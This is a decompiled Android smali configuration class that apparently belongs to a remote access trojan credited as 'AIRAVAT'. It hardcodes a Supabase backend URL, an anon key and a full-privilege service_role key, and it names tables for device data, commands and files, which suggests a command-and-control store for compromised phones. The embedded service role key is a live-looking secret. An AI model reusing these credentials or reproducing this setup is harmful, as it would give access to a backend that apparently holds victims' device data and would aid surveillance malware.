.class public Lsigma/male/supabase/SupabaseConfig;
.super Ljava/lang/Object;

# Static fields
.field public static final SUPABASE_URL:Ljava/lang/String; = "https://auedkftrlingnnyeezgc.supabase.co"
.field public static final SUPABASE_ANON_KEY:Ljava/lang/String; = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzUzOTMwNzQsImV4cCI6MjA1MDk2OTA3NH0.OJXZe6eQJOhmVeB9y8TE3L-8_zGWwEfB2eEp1SfLdpE"
.field public static final SUPABASE_SERVICE_ROLE_KEY:Ljava/lang/String; = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczNTM5MzA3NCwiZXhwIjoyMDUwOTY5MDc0fQ.gqOvWutgK_c7xr1wutw_kkJ7-4WieFQUfpUCcEA_1_0"
.field public static final DATABASE_TABLE:Ljava/lang/String; = "device_data"
.field public static final COMMANDS_TABLE:Ljava/lang/String; = "commands"
.field public static final FILES_TABLE:Ljava/lang/String; = "files"

# Direct methods
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static getSupabaseUrl()Ljava/lang/String;
    .locals 1
    const-string v0, "https://auedkftrlingnnyeezgc.supabase.co"
    return-object v0
.end method

.method public static getAnonKey()Ljava/lang/String;
    .locals 1
    const-string v0, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzUzOTMwNzQsImV4cCI6MjA1MDk2OTA3NH0.OJXZe6eQJOhmVeB9y8TE3L-8_zGWwEfB2eEp1SfLdpE"
    return-object v0
.end method

.method public static getServiceRoleKey()Ljava/lang/String;
    .locals 1
    const-string v0, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczNTM5MzA3NCwiZXhwIjoyMDUwOTY5MDc0fQ.gqOvWutgK_c7xr1wutw_kkJ7-4WieFQUfpUCcEA_1_0"
    return-object v0
.end method

.method public static getDeveloperCredit()Ljava/lang/String;
    .locals 1
    const-string v0, "AIRAVAT - Migrated to Supabase by bionic sailor"
    return-object v0
.end method
